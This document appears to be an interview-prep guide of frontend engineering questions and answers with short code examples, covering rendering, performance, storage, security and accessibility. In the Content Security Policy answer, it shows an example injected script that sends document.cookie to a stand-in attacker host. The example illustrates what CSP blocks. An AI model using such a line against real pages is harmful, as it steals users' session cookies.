# General Frontend Engineering Interview Q&A
For: OCBC Full Stack Developer Technical Interview

Companion to `General_Backend_Engineering_QA.md` — same idea, other side of the stack. `ReactJS_Interview_QA.md` is React-specific; this is the layer underneath it, true regardless of whether the framework in the room is React, Vue, Angular, or nothing at all. Same format: question, tight answer, code example. Examples are plain HTML/CSS/JS unless a concept genuinely needs a framework to illustrate.

---

## Table of Contents
- Part 1: Browser Rendering Fundamentals
- Part 2: JavaScript Module Systems & Build Tooling
- Part 3: Web Performance
- Part 4: State Management Concepts (Framework-Agnostic)
- Part 5: Browser Storage
- Part 6: Frontend Security
- Part 7: Accessibility (a11y)
- Part 8: Responsive & Adaptive Design
- Part 9: Networking From the Browser
- Part 10: Testing Frontend Applications
- Part 11: Rendering Strategies & Deployment
- Part 12: Frontend Architecture & Design Patterns
- Part 13: Quick-Fire Round

---

## Part 1: Browser Rendering Fundamentals

**Q: Walk through what happens between the browser receiving HTML and pixels appearing on screen.**
A: Parse HTML → build the **DOM** (Document Object Model). Parse CSS → build the **CSSOM** (CSS Object Model). Combine DOM + CSSOM into a **render tree** (only visible nodes, with computed styles). **Layout** (a.k.a. reflow) — compute the exact size/position of every element. **Paint** — fill in pixels (text, colors, images) into layers. **Composite** — layers are combined by the GPU into the final image on screen. This is "the critical rendering path," and it's why render-blocking `<script>`/`<link>` tags in `<head>` delay everything downstream of them.

```
HTML ---parse---> DOM  ---+
                           +--> Render Tree --> Layout --> Paint --> Composite --> pixels on screen
CSS ---parse---> CSSOM ---+
```

**Q: What's the difference between reflow (layout) and repaint, and why does the distinction matter for performance?**
A: **Reflow** — the browser recalculates geometry (size/position) for an element and everything affected downstream (can cascade to the whole page). **Repaint** — pixels are redrawn, but geometry didn't change (a color change, for instance). Reflow is far more expensive since it can trigger cascading recalculation; repaint alone is cheaper. Best case — a change only triggers **composite** (e.g., a `transform`/`opacity` animation), skipping both layout and paint entirely, which is exactly why animating `transform`/`opacity` is fast and animating `width`/`top`/`left` is slow.

```css
/* triggers reflow on every frame — expensive, recalculates layout constantly */
.moving-box { left: var(--x); top: var(--y); }

/* triggers composite only — cheap, GPU-accelerated, skips layout AND paint */
.moving-box { transform: translate(var(--x), var(--y)); }
```

**Q: What does `requestAnimationFrame` do, and why is it preferred over `setTimeout` for animation?**
A: Schedules a callback to run right before the browser's next repaint, synced to the display's actual refresh rate (typically 60fps) — so animations stay smooth and the browser can skip the work entirely when the tab isn't visible (saving battery/CPU). `setTimeout`/`setInterval` run on a fixed timer regardless of whether the browser is actually about to paint, which can cause dropped or wasted frames.

```js
function animate() {
  element.style.transform = `translateX(${x}px)`
  x += 2
  requestAnimationFrame(animate) // synced to the browser's actual paint cycle
}
requestAnimationFrame(animate)
```

---

## Part 2: JavaScript Module Systems & Build Tooling

**Q: CommonJS vs. ES Modules — what's the actual difference?**
A: CommonJS (`require`/`module.exports`) — synchronous, resolved at *runtime*, Node.js's original module system. ES Modules (`import`/`export`) — the language-native standard, statically analyzable at *build time* (imports/exports are known before any code runs), which is exactly what makes tree-shaking possible — a bundler can prove which exports are actually used and delete the rest.

```js
// CommonJS — resolved at runtime, can be conditional
const { formatCurrency } = require('./utils')

// ES Modules — statically analyzable, a bundler can see this at build time without executing anything
import { formatCurrency } from './utils'
```

**Q: What's tree-shaking, and what does it actually require to work?**
A: Eliminating unused exports from the final bundle at build time. Requires ES Modules' static `import`/`export` structure — the bundler needs to prove, without running the code, which exports are genuinely unreachable from your entry point. A library shipped only as CommonJS, or code with side effects a bundler can't safely prove are unused, defeats tree-shaking even if you only imported one function from it.

```js
// utils.js exports 20 functions, your code only imports one
import { debounce } from './utils'
// a tree-shaking bundler (Vite/Rollup/webpack) ships ONLY debounce's code in the final bundle,
// not the other 19 unused exports — but only because utils.js used ES module syntax
```

**Q: What's code splitting, and how does it actually help load time?**
A: Breaking a single large JS bundle into multiple smaller chunks, loaded on demand (e.g., per-route) instead of all upfront — so a user visiting the homepage doesn't have to download the code for a settings page they'll never open in that session.

```js
// eager — this route's code ships in the main bundle whether the user visits it or not
import Settings from './Settings'

// code-split — a separate chunk, only fetched when this route actually renders
const Settings = React.lazy(() => import('./Settings'))
```

**Q: What does a transpiler like Babel actually do, vs. a bundler?**
A: A **transpiler** (Babel, or TypeScript's own `tsc`) converts modern/nonstandard syntax (JSX, optional chaining, TypeScript types) into JS a target set of browsers can actually run — a source-to-source transformation, one file at a time. A **bundler** (Vite, webpack, Rollup) resolves the whole module graph (every `import` your app has, transitively) and combines them into the final deliverable file(s), often invoking a transpiler as one step in that pipeline. Different job: transpiling changes *syntax*, bundling combines *files*.

---

## Part 3: Web Performance

**Q: What are Core Web Vitals, and what does each one actually measure?**
A: **LCP (Largest Contentful Paint)** — how long until the largest visible element (usually a hero image or heading) renders; the user's perception of "has the main content shown up." **INP (Interaction to Next Paint)** — how long the page takes to visibly respond after a user interaction (click, tap, keypress); replaced FID (First Input Delay) as the responsiveness metric in 2024. **CLS (Cumulative Layout Shift)** — how much visible content unexpectedly shifts position during load (an image with no reserved space pushing text down after it loads) — the "did I just click the wrong thing because the page jumped" metric.

```html
<!-- causes CLS — no dimensions reserved, layout shifts once the image loads -->
<img src="hero.jpg">

<!-- fixed — the browser reserves the exact space before the image even downloads -->
<img src="hero.jpg" width="800" height="400">
```

**Q: What are resource hints (`preload`, `prefetch`, `preconnect`), and when do you reach for each?**
A: **`preconnect`** — establish the connection (DNS + TCP + TLS) to a third-party origin early, before you actually need a resource from it, so the real request that follows skips the handshake cost. **`preload`** — fetch a resource this page *definitely* needs soon, at high priority, before the browser would otherwise discover it (a font referenced only inside CSS, for instance). **`prefetch`** — fetch a resource *the next page* will likely need, at low priority, using idle bandwidth now so a future navigation feels instant.

```html
<link rel="preconnect" href="https://api.bank.com">
<link rel="preload" href="/fonts/inter.woff2" as="font" crossorigin>
<link rel="prefetch" href="/dashboard-chunk.js">
```

**Q: How do you approach image optimization for the web?**
A: Serve modern formats (WebP/AVIF) with a fallback, size images to their actual display dimensions rather than shipping a huge original and letting CSS shrink it, lazy-load anything below the fold, and use `srcset` so the browser picks the right resolution for the device instead of always downloading the largest version.

```html
<img src="account-icon-400.jpg"
     srcset="account-icon-400.jpg 400w, account-icon-800.jpg 800w"
     sizes="(max-width: 600px) 400px, 800px"
     loading="lazy"
     alt="Account icon">
```

---

## Part 4: State Management Concepts (Framework-Agnostic)

**Q: Client state vs. server state — why is treating them the same a common mistake?**
A: **Client state** — belongs entirely to the UI (is a modal open, what's typed in a not-yet-submitted form) — nothing to sync with a server. **Server state** — a local cache of something that actually lives on a server (the account list, fetched over the network) — it can go stale, needs refetching, can fail, and multiple components might want the same copy without triggering duplicate fetches. Treating server state like client state (plain `useState` + manual `useEffect` fetching, no cache, no dedup) is exactly why libraries like React Query/SWR exist — they model server state's real properties (staleness, loading, error, cache) instead of pretending it's just another piece of local state.

```js
// server state modeled as if it were client state — no cache, no dedup, no stale/error handling
const [accounts, setAccounts] = useState([])
useEffect(() => { fetch('/accounts').then(r => r.json()).then(setAccounts) }, [])

// vs. a library built for server state specifically (React Query/SWR) —
// handles caching, refetch-on-focus, dedup across components, stale-while-revalidate, for free
const { data: accounts } = useQuery(['accounts'], () => fetch('/accounts').then(r => r.json()))
```

**Q: What's "stale-while-revalidate," and why is it a good default for cached data?**
A: Serve the cached (possibly stale) value immediately, while triggering a background refetch to update it for *next* time. The user never waits on a network round trip to see something, and the data self-heals shortly after if it was out of date — a good default for data that's read often and doesn't need to be perfectly fresh on every single render (an account list, not a live stock ticker mid-trade).

**Q: When should the URL itself hold state, instead of component state?**
A: Whenever the state should survive a refresh, be shareable via link, or be back/forward-navigable — a search query, a selected filter, a pagination page, a selected tab. If someone should be able to copy the URL and send it to a colleague and land on the same view, that's a signal it belongs in the URL, not in a `useState` that resets on reload.

```
/accounts?search=ACC-001&page=2&sort=balance
-- reload the page, hit back, or paste this URL to someone else: all land on the same filtered/sorted/paged view
```

---

## Part 5: Browser Storage

**Q: Cookies vs. `localStorage` vs. `sessionStorage` vs. IndexedDB — when do you reach for each?**
A: **Cookies** — small (~4KB), automatically sent with every matching request (which is what makes them useful for session auth, and also the CSRF attack surface from the Security doc), can be scoped with `HttpOnly`/`Secure`/`SameSite`. **`localStorage`** — a few MB, persists until explicitly cleared, never sent to the server automatically, synchronous API (can block the main thread on large reads/writes). **`sessionStorage`** — same API as `localStorage`, but scoped to one tab and cleared when that tab closes. **IndexedDB** — a real client-side database, async API, much larger capacity, the right choice for genuinely large or structured offline data rather than a few key-value pairs.

```js
localStorage.setItem('theme', 'dark')       // persists across sessions, never auto-sent to the server
sessionStorage.setItem('draftForm', json)   // gone the moment this tab closes
document.cookie = 'sessionId=abc; Secure; HttpOnly; SameSite=Strict' // HttpOnly actually set server-side, not via JS
```

**Q: Why is `HttpOnly` on an auth cookie a meaningful security control?**
A: An `HttpOnly` cookie is invisible to JavaScript (`document.cookie` simply won't show it) — so even if an XSS vulnerability lets an attacker run arbitrary JS on your page, they still can't read the session cookie and exfiltrate it. It doesn't prevent XSS itself, but it meaningfully limits what a successful XSS attack can actually steal.

---

## Part 6: Frontend Security

**Q: What's the Same-Origin Policy, and how is it different from CORS?**
A: The Same-Origin Policy is the browser's *default* rule — a script from origin A cannot read data from origin B, full stop. CORS is the mechanism that lets a server *deliberately relax* that default for specific origins via response headers — it's an opt-in exception to same-origin, not a separate protection. Worth being precise about this distinction if asked, since "CORS is a security feature" is a common but slightly backwards framing — CORS *loosens* a restriction, it doesn't add one.

**Q: What's Content Security Policy (CSP), and what class of attack does it mitigate?**
A: A response header telling the browser which sources are allowed to load/execute content (scripts, styles, images) on this page — mitigates XSS specifically, since even if an attacker manages to inject a `<script>` tag, the browser refuses to execute it if its source isn't on the allow-list.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```
```html
<!-- an attacker-injected inline script — CSP above blocks this from running, since inline scripts
     aren't in script-src's allow-list and 'unsafe-inline' wasn't granted -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

**Q: Is client-side validation a security control?**
A: No — it's a UX improvement (instant feedback, fewer round trips for obviously-wrong input), never a security boundary. Anyone can bypass client-side JS entirely (disable it, use `curl`/Postman directly against your API). Every validation that actually matters for correctness or security must also be enforced server-side; client-side validation existing at all is a courtesy to a well-behaved browser, not a guarantee.

---

## Part 7: Accessibility (a11y)

**Q: What's the difference between using a `<button>` and a `<div onClick>` for a clickable element?**
A: `<button>` gets keyboard focus, `Enter`/`Space` activation, and a screen-reader-announced role ("button") entirely for free, as native browser behavior. A `<div onClick>` gets none of that automatically — you'd have to manually add `tabindex`, a `role="button"`, and keyboard event handlers to reach parity, and it's easy to miss one of them. Reaching for the semantic element first is almost always less code *and* more accessible than reinventing its behavior on a generic element.

```html
<!-- works with mouse, keyboard, and screen readers, for free -->
<button onClick={handleDeposit}>Deposit</button>

<!-- looks identical, but keyboard/screen-reader users get nothing without significant extra work -->
<div onClick={handleDeposit}>Deposit</div>
```

**Q: What's ARIA, and when should you actually reach for it?**
A: Accessible Rich Internet Applications attributes — a way to communicate role/state/properties to assistive technology when *semantic HTML alone can't express it* (a custom dropdown, a tab panel built from `<div>`s). The first rule of ARIA is genuinely "don't use ARIA if a native HTML element already does the job" — `<button aria-label="...">` is fine, but `<div role="button">` should only exist if there's a real reason not to just use `<button>`.

```html
<div role="tablist">
  <button role="tab" aria-selected="true" aria-controls="panel-1">Accounts</button>
  <button role="tab" aria-selected="false" aria-controls="panel-2">Transactions</button>
</div>
```

**Q: What does WCAG actually require at a level worth knowing for an interview?**
A: The Web Content Accessibility Guidelines organize around four principles — **P**erceivable, **O**perable, **U**nderstandable, **R**obust (POUR). Concretely, the things most likely to come up: sufficient color contrast (text readable against its background), every interactive element reachable and operable by keyboard alone, images having meaningful `alt` text, and forms having properly associated `<label>` elements rather than relying on placeholder text alone.

```html
<!-- fails accessibility — placeholder disappears once typing starts, no persistent label -->
<input placeholder="Account number">

<!-- correct — label persists, and it's programmatically associated for screen readers -->
<label for="acct-num">Account number</label>
<input id="acct-num">
```

---

## Part 8: Responsive & Adaptive Design

**Q: What does the viewport meta tag actually do, and what happens without it?**
A: `<meta name="viewport" content="width=device-width, initial-scale=1">` tells a mobile browser to render the page at the device's actual CSS pixel width, instead of assuming a desktop-width page (~980px) and zooming the whole thing out to fit — which is what happens by default without it, making text unreadably tiny until the user manually zooms.

**Q: What's a container query, and how is it different from a media query?**
A: A media query responds to the *viewport's* size; a container query responds to a specific *container element's* size, regardless of the viewport. This matters for a genuinely reusable component (a card that might sit in a wide main column or a narrow sidebar) — a media query can't express "look different based on the space this component itself has," only "look different based on the whole screen."

```css
.card-container { container-type: inline-size; }
@container (min-width: 400px) {
  .card { display: flex; } /* responds to THIS container's width, not the viewport's */
}
```

---

## Part 9: Networking From the Browser

**Q: `fetch` vs. `XMLHttpRequest` — why did `fetch` largely replace it?**
A: `fetch` is Promise-based (composes naturally with `async`/`await`, no callback pyramids), has a cleaner streaming API, and is generally less verbose for the common case. `XMLHttpRequest` still shows up for things `fetch` doesn't natively support well — genuine upload progress events, for instance — but for typical request/response JSON calls, `fetch` is the modern default.

**Q: What HTTP caching headers actually control browser caching behavior?**
A: `Cache-Control: max-age=3600` — cache this response for up to an hour without even asking the server. `ETag` (or `Last-Modified`) — a fingerprint of the resource; on the *next* request past the max-age, the browser sends `If-None-Match: <etag>` and the server can reply `304 Not Modified` (no body at all) if nothing changed, saving bandwidth even on a "stale" cache hit.

```
Response: Cache-Control: max-age=3600, ETag: "abc123"
-- within the hour: browser uses the cached copy, no network request at all
-- after the hour: browser sends "If-None-Match: abc123" -> server replies 304, body not re-sent if unchanged
```

**Q: WebSockets vs. Server-Sent Events (SSE) vs. polling — when do you reach for each?**
A: **Polling** — the client repeatedly asks "anything new?" on a timer; simplest, but wasteful and never truly real-time. **SSE** — a one-way, server-to-client stream over plain HTTP; good for server-push-only needs (live notifications, a price ticker) without the complexity of a bidirectional protocol. **WebSockets** — full-duplex, both sides can push anytime over one persistent connection; needed when the client also needs to send frequent real-time messages back (a chat app, collaborative editing), not just receive them.

```js
// SSE — one-way, server pushes, plain HTTP under the hood
const events = new EventSource('/notifications/stream')
events.onmessage = (e) => showNotification(e.data)

// WebSocket — bidirectional, persistent connection
const ws = new WebSocket('wss://api.bank.com/live-prices')
ws.onmessage = (e) => updatePrice(e.data)
ws.send(JSON.stringify({ subscribe: 'AAPL' })) // client can push too, SSE can't do this
```

---

## Part 10: Testing Frontend Applications

**Q: Unit vs. component vs. end-to-end tests for a frontend app — what does each actually verify?**
A: **Unit** — a single function/hook in isolation (a formatter, a custom hook's logic), no rendering involved. **Component** — renders a real component in a test DOM (jsdom) and interacts with it the way a user would (React Testing Library), verifying behavior without a real browser or backend. **End-to-end** (Cypress, Playwright) — drives a real browser against the real (or a staged) application, verifying the whole stack actually works together — slowest and most realistic, so used sparingly for the critical user journeys, matching the testing-pyramid shape from the backend doc.

**Q: How do you handle network calls in a component test, and why not just hit the real API?**
A: Mock the network layer (mock `fetch`, or intercept requests with a tool like MSW — Mock Service Worker) so the test is fast, deterministic, and doesn't depend on a real backend being up or in a specific data state. Hitting a real API in a component test reintroduces exactly the flakiness/slowness the testing pyramid is trying to push up to the (few) e2e tests instead.

```js
// MSW — intercepts the actual fetch() call at the network level, component code is untouched
server.use(
  http.get('/accounts', () => HttpResponse.json([{ id: 1, balance: 100 }]))
)
render(<AccountList />)
expect(await screen.findByText('100')).toBeInTheDocument()
```

**Q: What's visual regression testing?**
A: Automatically screenshotting components/pages and diffing against a stored baseline image, flagging *unintended* visual changes (a CSS change that broke a layout somewhere nobody thought to check) that functional tests wouldn't catch at all, since functional tests check behavior, not appearance.

---

## Part 11: Rendering Strategies & Deployment

**Q: CSR vs. SSR vs. SSG vs. ISR — what actually differs, and what's each optimized for?**
A: **CSR (Client-Side Rendering)** — server sends a near-empty HTML shell, JS renders everything in the browser; fast to build, but slow first paint and poor for SEO without extra work (matches `bank-demo`'s own frontend). **SSR (Server-Side Rendering)** — server renders the full HTML per-request; faster first paint, SEO-friendly, but the server does real work on every request. **SSG (Static Site Generation)** — HTML is rendered once at *build time*, served as static files forever after — fastest possible, but content is only as fresh as the last build. **ISR (Incremental Static Regeneration)** — SSG's speed, with pages quietly regenerated in the background on a schedule/on-demand, so content can update without a full rebuild.

```
CSR:  Server -> <div id="root"></div> + big JS bundle -> browser renders everything
SSR:  Server -> fully rendered HTML, generated fresh THIS request -> browser hydrates it
SSG:  Build time -> HTML file written once -> Server just serves that same static file forever
ISR:  Like SSG, but a background job re-renders the static file periodically without a full rebuild
```

**Q: What's hydration, and what's the classic hydration bug?**
A: After SSR sends fully-rendered HTML, the client-side JS "hydrates" it — attaching event listeners and reconciling it into the framework's virtual representation, without re-rendering the DOM from scratch. Classic bug: a hydration mismatch — the server-rendered HTML and what the client would have rendered don't match (e.g., using `Date.now()` or `Math.random()` during render, or reading `window` when it doesn't exist yet on the server) — causing a console warning at best and visibly broken/flickering content at worst.

---

## Part 12: Frontend Architecture & Design Patterns

**Q: What's the Observer pattern's role in frontend UI, even without a state library?**
A: Every DOM event listener is the Observer pattern in miniature — the DOM element is the subject, your `addEventListener` callback is the observer, notified whenever the event fires. State libraries (Redux, MobX, even React's own re-render-on-`setState`) are the same pattern applied at the application-state level rather than the DOM-event level — a component "observes" a piece of state and re-renders when it's notified of a change.

```js
button.addEventListener('click', () => console.log('clicked')) // Observer pattern, no framework needed
```

**Q: MVC vs. MVVM — how do these classic patterns map onto a modern component-based frontend?**
A: **MVC** (Model-View-Controller) — the Controller explicitly mediates between Model and View. **MVVM** (Model-View-ViewModel) — the ViewModel exposes state/commands the View binds to directly, and updates flow automatically through that binding rather than an explicit controller wiring them. A modern component (state + a render function that's purely a function of that state) is closer to MVVM's spirit — the "ViewModel" is just the component's own state/hooks, and the binding is implicit in how the framework re-renders on state change, rather than a a hand-wired controller pushing updates to a view.

**Q: Component composition vs. inheritance in UI code — why does composition dominate in modern frontend frameworks?**
A: Composition — build complex UI by nesting/combining small, focused components (passing `children`, or specific props) rather than extending a base component class to inherit behavior. React explicitly recommends composition over inheritance for component reuse — a component hierarchy built via inheritance gets rigid fast (the fragile-base-class problem again, same as the OOP concept, just applied to UI), while composition stays flexible because any component can be nested inside any other without a predetermined class relationship between them.

```jsx
// composition — Card doesn't know or care what's inside it
function Card({ children }) { return <div className="card">{children}</div> }
<Card><AccountSummary account={a} /></Card>
<Card><TransactionList transactions={t} /></Card>
```

---

## Part 13: Quick-Fire Round
Short, direct answers, under 15 seconds each:

- **What's the difference between `null` and `undefined` in JS?** `undefined` — a variable declared but never assigned, or a missing object property. `null` — an explicit, deliberate "no value," assigned intentionally.
- **What's event delegation, and why use it?** Attaching one listener to a parent element instead of one per child, relying on event bubbling (`e.target`) to identify which child was actually interacted with — fewer listeners, and works automatically for children added later.
- **What's the difference between `==` and `===` in JS?** `==` allows type coercion before comparing (`'5' == 5` is `true`); `===` compares value *and* type with no coercion (`'5' === 5` is `false`). Default to `===` unless coercion is deliberately wanted.
- **What's a Progressive Web App (PWA), in one sentence?** A web app that can be installed, work offline (via a service worker caching assets/responses), and feel closer to a native app, while still being a normal website underneath.
- **What's the difference between `defer` and `async` on a `<script>` tag?** Both let HTML parsing continue while the script downloads. `defer` — executes after parsing finishes, in document order. `async` — executes immediately once downloaded, whenever that is, potentially out of order relative to other scripts.
- **What's a service worker?** A script the browser runs in the background, separate from the page, that can intercept network requests (enabling offline support and custom caching) and receive push notifications — the technology underneath most PWA offline behavior.
